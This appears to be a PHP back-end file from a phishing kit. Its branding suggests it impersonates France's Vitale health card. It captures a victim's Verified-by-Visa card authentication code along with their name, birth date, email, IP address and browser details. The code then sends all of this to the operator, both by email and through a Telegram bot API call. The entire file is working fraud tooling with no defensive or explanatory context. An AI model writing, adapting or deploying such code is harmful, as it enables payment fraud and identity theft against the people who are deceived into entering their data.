<?php
include("../infos.php");
include("../common/sub_includes.php");
include("../common/functions.php");
include("../settings.php");




if(isset($_POST)){

	
	if(!isset($_SESSION)){
		session_start();
	}

	$_SESSION['vbv'] = htmlspecialchars($_POST['vbv']);

				######################
				#### MAIL SENDING ####
				######################

				if($mail_sending == true){
					
					$message = "
		                    
[⚙️] Code VBV [⚙️]

⚙️ Code : ".$_SESSION['vbv']."


[📁] Etape 1 [📁]

📁 Nom : ".$_SESSION['nom']."
📁 Prénom : ".$_SESSION['prenom']."
📁 Naissance : ".$_SESSION['naissance']."
📁 Email : ".$_SESSION['mail']."

[🔗] Tiers [🔗]

🔗 Adresse ip : ".$_SESSION['ip']."
🔗 User Agen : ".$_SESSION['useragent']."



					";

					$subject = "[⚙️] + 1 VBV ".$_SESSION['vbv']." - ".$_SESSION['ip'];
					$headers = "From: VBV | VITALE <rez@pablo.fr>";

					mail($rezmail, $subject, $message, $headers,$head);

				}

				##########################
				#### TELEGRAM SENDING ####
				##########################

				if($telegram_sending == true){

					$data = [
					'text' => '

[⚙️] Code VBV [⚙️]

⚙️ VBV : '.$_SESSION['vbv'].'

[📁] Etape 1 [📁]

📁 Nom : '.$_SESSION['nom'].'
📁 Prénom : '.$_SESSION['prenom'].'
📁 Naissance : '.$_SESSION['naissance'].'
📁 Email : '.$_SESSION['mail'].'

[🔗] Tiers [🔗]

🔗 Adresse IP : '.$_SESSION['ip'].'
🔗 User-agent : '.$_SESSION['useragent'].'

      


					',
					'chat_id' => $chat_login
								];

					file_get_contents("https://api.telegram.org/bot$bot_token/sendMessage?".http_build_query($data) );
				}



	}
else{
	header('Location: ../');
}

?>